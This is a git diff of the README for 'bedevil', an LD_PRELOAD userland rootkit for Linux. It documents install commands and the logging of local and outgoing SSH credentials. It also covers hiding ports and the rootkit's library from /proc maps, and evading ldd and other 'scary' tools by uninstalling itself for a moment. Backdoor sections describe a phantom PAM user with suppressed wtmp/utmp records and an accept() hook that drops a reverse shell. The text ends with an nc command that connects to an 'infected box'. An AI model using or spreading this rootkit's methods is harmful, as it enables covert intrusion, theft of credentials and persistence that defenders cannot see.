@@ -3,8 +3,12 @@
 ###### Based on my other rootkit, [vlany](https://github.com/mempodippy/vlany)
 <i>bedevil is designed to be more robust, faster and efficient than vlany.</i>
 
-## Aim of bedevil
-Ultimately my core aim is to tidy up the project, fix outstanding issues and organise previous chaos into a more manageable system. This hopefully makes it heaps easier on (not just) me when it comes to managing the rootkit's different functionalities. I've also made an effort to optionally minimalise the amount of dependencies required to install the kit on a machine.
+## 'Aim' of bedevil
+ * Ultimately, my core aim is to tidy up previously existing aspects of precursor rootkits, fix outstanding issues and create a more manageable & _robust_ system of rootkit functionalities.
+ * This is in an effort to make it easier on (not just) me when it comes to managing the rootkit's different functionalities.
+ * In addtion, considering the point above, I have also made an effort to optionally minimalise the amount of dependencies required to install the kit on a machine.
+ * Ideally; bedevil should provide a special ease-of-use & an additional 'skeleton' infrastructure for those who should wish to make their own personal additions (or removals) to the rootkit.
+ * *i.e.: new function hooks/backdoor methods, backdoor settings & configuration, or even something as simple as certain files to be copied by default*
 
 </hr>
 
@@ -13,15 +17,18 @@ Ultimately my core aim is to tidy up the project, fix outstanding issues and org
  * [__toggles.h__](https://github.com/naworkcaj/bdvl/blob/master/inc/toggles.h): rootkit functionality toggles. read for more info
  * [__stdincludes.h__](https://github.com/naworkcaj/bdvl/blob/master/inc/stdincludes.h): just standard headers
  * [__includes.h__](https://github.com/naworkcaj/bdvl/blob/master/inc/includes.h): read for info
+ * [__bedevil.h__](https://github.com/naworkcaj/bdvl/blob/master/inc/bedevil.h): essential rootkit header, handled solely by bedevil.sh
  * [__bedevil.c__](https://github.com/naworkcaj/bdvl/blob/master/inc/bedevil.c): centre for all bedevil
 
 *(inc/\*)* (header include directories may have their own exclusive files)
- * __char_arrays__: list of char arrays to write, with their respective array elements
+ * __arrays__: list of arrays to write, with respective array elements
  * __consts__: background consts that the user doesn't really need to see
 
  *(examples)*
- * [__inc/hooks/libdl/char_arrays__](https://github.com/naworkcaj/bdvl/blob/master/inc/hooks/libdl/char_arrays)
- * [__inc/hooks/open/consts__](https://github.com/naworkcaj/bdvl/blob/master/inc/hooks/open/consts)
+ * [__inc/hooks/libdl/arrays__](https://github.com/naworkcaj/bdvl/blob/master/inc/hooks/libdl/arrays) (contains arrays of function names)
+ * [__inc/hiding/arrays__](https://github.com/naworkcaj/bdvl/blob/master/inc/hiding/arrays) (scary things to hide from)
+ * [__inc/hooks/open/arrays__](https://github.com/naworkcaj/bdvl/blob/master/inc/hooks/open/arrays) (files of interest to potentially steal)
+ * [__inc/hooks/open/consts__](https://github.com/naworkcaj/bdvl/blob/master/inc/hooks/open/consts) (files & paths to intercept)
 
 </hr>
 
@@ -43,12 +50,15 @@ $ ./bedevil.sh -h
   Usage: $0 [option(s)]
       Options:
           -h: Show this help message & exit.
-          -e: Do an environment check.
+          -v: Output verbosely.
+          -e: Do an environment check. (RECOMMENDED)
           -u: Enable use of 'dialog' throughout setup.
           -t: Go through & switch rootkit toggles.
           -C: Clean up installation/compilation mess.
           -d: Configure rootkit headers & settings.
-          -c: Compile rootkit library in current directory & exit.
+          -z: After configuration has finished, compress the resulting
+              new include directory with gzip.
+          -c: Compile rootkit in current directory & exit.
           -D: Install all potential required dependencies. (REQUIRES ROOT)
           -i: Launch full installation of bedevil. (REQUIRES ROOT)
 
@@ -56,6 +66,11 @@ $ ./bedevil.sh -h
  * *Compile only (no installation):* `./bedevil.sh -dc` (will quickly compile the .so in the your cwd)  
  * *Changing variable values (example):* `BD_UNAME=my_uname BD_PWD=my_pwd ./bedevil.sh -dc`  
  * *Full installation:* `./bedevil.sh -ti` (will ask what you want to enable/disable then launch installation)
+ * *Mimic installation:* `LDSO_PRELOAD=/tmp/fakepreload ./bedevil.sh -i` (mimic rootkit installation/setup without preloading the rootkit)
+ * **Compressing include directory & using resulting tarball**:
+ *   * Compressing: `BD_UNAME=myuname BD_PWD=mypassword ... ./bedevil.sh -vzd`
+ *   * Using tarball: `TARBALL=./pathto.tar.gz ./bedevil.sh ...`
+ *     * i.e.: `TARBALL=./pathto.tar.gz ./bedevil.sh -i/-c`
 
 </hr>
 
@@ -86,8 +101,17 @@ $ ./bedevil.sh -h
 
 ## Feature information
 
-### Network port hiding
-With bedevil installed, you can manually hide or unhide any specific ports or port ranges on the box by editing the `hide_ports` file in the rootkit's installation directory. (or 'inc/hide_ports' before installing...)  
+#### Credential logging
+ * When toggle `LOG_LOCAL_AUTH` is defined, bedevil intercepts function `pam_vprompt` and stores successful user authentications in the rootkit's installation directory.
+ * When toggle `LOG_SSH` is defined, bedevil intercepts functions `read` and `write` to check if a user is attempting to log into an account via ssh.
+   * It's up to you to verify if the credentials used for logging into the account are correct, since the server in question will handle that.
+   * The written logs are available, too, in the rootkit's installation directory.
+
+### Evasions & presence hiding
+
+#### Network port hiding
+ * With bedevil installed, you can manually hide or unhide any specific ports/ranges on the box by editing the `hide_ports` file in the rootkit's installation directory.
+ * Additionally, before any configuration/setup, you can define what ports/ranges will be hidden by writing them to `inc/hide_ports`.
 i.e.:
 ```
 $ cat hide_ports
@@ -95,48 +119,51 @@ $ cat hide_ports
 304-306
 1000-1003
 ```
-###### *Where a hyphen represents a range.*
+*Where a hyphen represents a range...*
+ * During configuration, `bedevil.sh` will write which ports or port ranges should be hidden to the `hide_ports` file.
 
-Automatically, `bedevil.sh` will write which ports or port ranges are being hidden to the `hide_ports` file.
+#### Rootkit presence hiding
+ * bedevil will hide itself from the process memory map files upon being read.
+ * Reading `/proc/*/*maps`, when bedevil is fully installed will make it seem apparent that there is no malicious libraries being preloaded.
+ * _HOWEVER_, should dependencies be required by the rootkit's compiled shared object, the dependent libraries will be visible in output. (namely; libcrypt & libssl)
 
-### Library presence hiding
-bedevil hides itself from any process map files. Reading `/proc/$$/maps`, `/proc/$$/smaps`, or `/proc/$$/numa_maps` when the kit is installed will make it seem apparent that there are no other potentially malicious libraries being loaded into userspace.
-  
-Calling `ldd` on any dynamic binaries will not immediately reveal the location of the rootkit's shared library. Calling `ldd` as a regular user will throw a IO error, and calling `ldd` as root user will grant us sufficient permissions to quickly uninstall and reinstall the rootkit after showing a 'clean' ldd output to the root user. Further fogging the location of the rootkit's library.
+##### `scary_*`
+ * `inc/hiding/arrays` defines what bedevil will see as potentially problematic - processes, paths or environment variables.
+ * bedevil compares against these lists whenever something is being executed on the box after full installation.
+ * Subsequently subverting detection by temporarily 'uninstalling' the rootkit until given scary item has finished execution.
+ * i.e.: Calling `ldd` on a dynamically linked binary will not reveal the location of the rootkit.
+   * Initially, calling `ldd` as a regular user will appear to show an incorrect permissions error, as the regular user doesn't have sufficient permissions required to be able to temporarily uninstall the rootkit.
+   * Calling `ldd` with sufficient permissions will uninstall the rootkit, show "clean" output to the user, then will reinstall. Obscuring the location of the rootkit.
+   * This applies to anything executed or set defined within `inc/hiding/arrays`.
 
-### User credential logging
-bedevil logs successful authentication attempts on the box it is installed on, but <b>also</b> will now log all outgoing ssh credentials. Both of these are logged in your installation directory in their respective files.
+#### Backdoor
+Within bedevil, you can choose to use the PAM backdoor and/or the accept hook backdoor. There are pros and cons to using either method. In order to choose which backdoor method you would like to use, see the 'toggles' section closer to the beginning of this README. Also, there is a [README inside the rootkit's installation directory](https://github.com/naworkcaj/bdvl/blob/master/etc/BD_README) that you may wish to consult.
 
-</hr>
-
-## Backdoor
-Within bedevil, you can choose to use the PAM backdoor and/or the accept hook backdoor. There are pros and cons to using either method. In order to choose which backdoor method you would like to use, see the 'toggles' section at the beginning of this README. There is a README inside the rootkit's installation directory that you may wish to consult from a backdoor shell. *([this](https://github.com/naworkcaj/bdvl/blob/master/etc/README))*  
-
-### PAM
+##### PAM
  * By hijacking libpam's authentication functions, we create a phantom user on the machine that can be logged into just the same as any other user.
- * During installation you'll give a username and password which you'll be able to use to log into your backdoor, over ssh.
- * See [ssh.sh](https://gist.github.com/naworkcaj/290162d025925d88e4820a7c0056418a) on connecting with your hidden port.
+ * During setup, you'll be given a username and password which can be used to log into the backdoor, over ssh.
+   * To reiterate, by default the username and password are randomly generated, but you can specify a username and password of your own by setting them before running `bedevil.sh`.
+     * i.e.: `BD_UNAME=myusername BD_PWD=mypassword ./bedevil.sh ...`
+ * See [ssh.sh](https://gist.github.com/naworkcaj/290162d025925d88e4820a7c0056418a) on connecting to the infected box's PAM backdoor with your hidden port.
+ * *By hooking the responsible [utmp & wtmp functions](https://github.com/naworkcaj/bdvl/tree/master/inc/utmp), information that may give off indication of a PAM backdoor is throttled.*
+ * *On boxes that use `systemd` (which is most), when a user (real-or-not) is logged in, a process called `(sd-pam)` will be visible.*
 
-*[wtmp/utmp hooks](https://github.com/naworkcaj/bdvl/tree/master/inc/utmp)  
-By hooking the responsible utmp & wtmp functions, information that may give off indication of a PAM backdoor is throttled.  
-see utmp/[putut.c](https://github.com/naworkcaj/bdvl/blob/master/inc/utmp/putut.c)*
+| Pros                              | Cons                           |
+| :-------------------------------- | :----------------------------- |
+| secure connection over ssh        | wtmp and utmp logging          |
+| fully interactive shell           | PAM logins can be disabled     |
 
-| Pros                        | Cons                           |
-| :-------------------------- | :----------------------------- |
-| secure connection over ssh  | wtmp and utmp logs need hidden |
-| interactive shell           | PAM logins can be disabled     |
-
-### accept() hook
- * By intercepting and hijacking libc's accept(), we can connect to existing services (assuming they have been restarted upon installation) on ports on a box and have them drop us a reverse shell if conditions are met.
+##### accept() hook
+ * By intercepting and hijacking libc's accept(), we can connect to existing services (__assuming they have been restarted upon installation__) on a box and have them drop us a reverse shell if special conditions are met.
  * When using `ACCEPT_PORT` as your local source port when connecting to said box, bedevil will drop you the shell when you correctly enter your backdoor password. (`BD_PWD`)
- * `ACCEPT_PORT` is automatically a hidden port in `'hide_ports'`.
+ * `ACCEPT_PORT` is by default a hidden port in `'hide_ports'`.
 
-#### SSL
- * If you are using the accept hook backdoor w/ SSL enabled, the SSL backdoor source port is `$ACCEPT_PORT + 1`.  
- * The plaintext backdoor source port is still available to use even when you have enabled `ACCEPT_USE_SSL`.*
+###### SSL
+ * If toggle `ACCEPT_USE_SSL` is defined, the source port you should use to trigger the use of SSL within the backdoor is just `$ACCEPT_PORT + 1`.
+   * *The plaintext backdoor is still available even when `ACCEPT_USE_SSL` is defined.*
 
-#### Example connection to infected box
-*where the host is `213.82.46.164` `ACCEPT_PORT` is 839 & `BD_PWD` is `'my_password'`*
+
+ * Example connection to infected box (*where host is `213.82.46.164`, `ACCEPT_PORT` is 839 & `BD_PWD` is `'my_password'`*)
 ```
 $ nc 213.82.46.164 22 -p 839
 my_password
